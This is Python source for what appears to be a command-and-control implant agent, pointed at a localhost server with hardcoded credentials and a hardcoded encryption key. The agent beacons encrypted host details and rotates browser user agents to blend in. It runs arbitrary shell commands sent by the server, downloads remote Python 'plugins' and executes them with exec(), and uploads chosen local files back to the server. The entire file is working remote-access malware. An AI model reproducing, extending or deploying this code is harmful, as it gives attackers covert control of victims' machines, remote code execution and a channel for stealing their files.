import time
import requests
import importlib.util
import sys
import random
import subprocess
import json
import socket
import getpass
import platform
from cryptography.fernet import Fernet
import importlib.util
from multiprocessing import Process
from datetime import datetime ,timezone


SERVER_URL = "http://localhost:5000"
BEACON_ENDPOINT = "/beacon"
RESULT_ENDPOINT = "/result"
UPLOAD_ENDPOINT = "/upload"
LOGIN_ENDPOINT = "/login"

username = "agent2"
password = "pass2"

SLEEP_MIN = 5
SLEEP_MAX = 10

AGENT_ID = "2"
TOKEN = ""


USER_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"
]


SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
cipher = Fernet(SECRET_KEY)

scheduled_tasks = []


def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()


def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()


def get_system_info():

    return {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "os": platform.system() + " " + platform.release()
    }


def login():
    global TOKEN

    payload = {
        "username": username,
        "password": password,
        "agent_id": AGENT_ID
    }

    try:
        response = requests.post(
            SERVER_URL + LOGIN_ENDPOINT,
            json=payload,
            timeout=10
        )


        if response.status_code != 200:
            return False

        data = response.json()


        if data.get("status") == "ok":
            TOKEN = data.get("token")

            if not TOKEN:
                return False
            return True

        return False

    except Exception as e:
        print("Login exception:", e)
        return False

def beacon():

    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}

    payload = get_system_info()

    encrypted_payload = encrypt_data(json.dumps(payload))

    try:

        response = requests.post(
            SERVER_URL + BEACON_ENDPOINT,
            json={"data": encrypted_payload},
            headers=headers
        )

        if response.status_code == 200:
            data = response.json()
            # iterates through tasks offered by beacon , Avoids adding same task by filtering through UUID
            if data:
                for item in data:
                    if item["uuid"] not in scheduled_tasks:
                        scheduled_tasks.append(item)
            else:
                return "No tasks"
            # Sorts the tasks by scheduled exec time in an ascending matter
            scheduled_tasks.sort(key=lambda x: x['scheduled_at'], reverse=False)
            # pops first task supposed to be executed
            task_to_run = scheduled_tasks.pop(0)
            print(task_to_run)

            task = task_to_run["task"]
            task_uuid = task_to_run["uuid"]
            scheduled_at = task_to_run["scheduled_at"]


            scheduled_at_cmp = datetime.fromisoformat(scheduled_at)
            current_time = datetime.now(timezone.utc)

            if scheduled_at_cmp <=current_time:
                if task and task_uuid:
                    execute_task(task, task_uuid)

            else:
                print("No tasks to run")

    except Exception as e:
        print(f"[!] Beacon error: {e}")


def execute_task(task, task_uuid):

    task_type = task.get("type")

    print(f"[+] Task Type: {task_type}")

    if task_type == "shell":

        command = task.get("command")
        execute_shell(command, task_uuid)

    elif task_type == "download":

        save_as = task.get("save_as")
        url = task.get("url")
        download_file(url, save_as, task_uuid)

    elif task_type == "upload":

        path_to_file = task.get("path_to_file")
        upload_file(path_to_file, task_uuid)

    elif task_type == "sleep":

        global SLEEP_MIN, SLEEP_MAX

        SLEEP_MIN = task.get("min", SLEEP_MIN)
        SLEEP_MAX = task.get("max", SLEEP_MAX)

        print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid,executed_at)


def execute_shell(command, task_uuid):

    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE,
            text=True,
            bufsize=1
        )

        collected_output = []

        try:
            for line in process.stdout:
                if not line:
                    break
                print(line, end="")
                collected_output.append(line)

            if process.poll() is not None:
                print("[!] Connection closed by remote host.")

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")

        finally:
            process.kill()
            print("[*] Connection terminated.")

        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

        # Join collected output into a single string
        final_output = "".join(collected_output)

        post_result(f"[+] Executed:{final_output}", task_uuid, executed_at)

    except Exception as e:
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[!] Error: {str(e)}", task_uuid, executed_at)


# 1. Move the inner function to the top level
def execute_plugin(content, module_name, task_uuid):
    """This function is now picklable because it is at the top level."""
    try:
        spec = importlib.util.spec_from_loader(module_name, loader=None)
        module = importlib.util.module_from_spec(spec)

        # Execute the code within the module's namespace
        exec(content, module.__dict__)
        sys.modules[module_name] = module

        if hasattr(module, "run"):
            module.run()
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            print(f"[+] Plugin '{module_name}' executed successfully")
            post_result(f"[+] Plugin '{module_name}' executed", task_uuid,executed_at)
        else:
            print(f"[!] Plugin '{module_name}' has no run() function")
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            post_result(f"[!] Error: Plugin '{module_name}' has no run() function", task_uuid,executed_at)

    except Exception as e:
        print(f"[!] Plugin '{module_name}' crashed: {e}")
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[!] Error: Plugin '{module_name}' crashed: {e}", task_uuid,executed_at)

def download_file(url, save_as=None, task_uuid=None):
    try:
        print(f"[+] Downloading {url}")
        r = requests.get(url)
        r.raise_for_status()

        if "/plugins" in url:
            content = r.text.replace("\r\n", "\n")
            module_name = url.split("/")[-1].replace(".py", "")

            # 2. Pass arguments to the top-level function via 'args'
            p = Process(
                target=execute_plugin,
                args=(content, module_name, task_uuid)
            )
            p.start()
            p.join(timeout=10)

            if p.is_alive():
                print(f"[!] Plugin '{module_name}' timed out, terminating...")
                p.terminate()
                p.join()
                executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                post_result(f"[!] Error: Plugin '{module_name}' aborted due to timeout", task_uuid,executed_at)
        else:
            if save_as is None:
                save_as = url.split("/")[-1]
            with open(save_as, "wb") as f:
                f.write(r.content)
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            post_result(f"Downloaded file {save_as}", task_uuid,executed_at)

    except Exception as e:
        print(f"[!] Error: download failed {url}: {e}")
        if task_uuid:
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            post_result(f"[!] Error: {e}", task_uuid,executed_at)


def upload_file(path_to_file, task_uuid):
    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}

    try:

        with open(path_to_file, "rb") as file:

            files = {"file": file}

            data = {"agent_id": AGENT_ID}

            response = requests.post(
                SERVER_URL + UPLOAD_ENDPOINT,
                headers=headers,
                files=files,
                data=data
            )
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(
            f"[+] Uploaded {path_to_file} ({response.status_code})",
            task_uuid,executed_at
        )

    except Exception as e:

        print(f"[!] Upload error: {e}")
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[!] Error: Failed to upload : {e}", task_uuid,executed_at)


def post_result(result, task_uuid,executed_at=None):
    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}

    payload = {
        "id": AGENT_ID,
        "output": result,
        "uuid": task_uuid,
        "executed_at":executed_at
    }

    encrypted_payload = encrypt_data(json.dumps(payload))

    try:

        requests.post(
            SERVER_URL + RESULT_ENDPOINT,
            json={"data": encrypted_payload},
            headers=headers
        )

    except Exception as e:

        print(f"[!] Result posting error: {e}")


def main():
    attempts = 0
    while attempts < 5:
        if login():
            print("[+] Agent authenticated")
            break
        else:
            attempts += 1
            print(f"[!] Agent login failed (attempt {attempts}/{5})")
            time.sleep(3)  # wait a bit before retrying
    else:
        print("[!] Max login attempts reached. Exiting...")
        return

    # Main loop after successful login
    while True:
        beacon()
        sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
        print(f"[+] Sleeping {sleep_time} seconds")
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()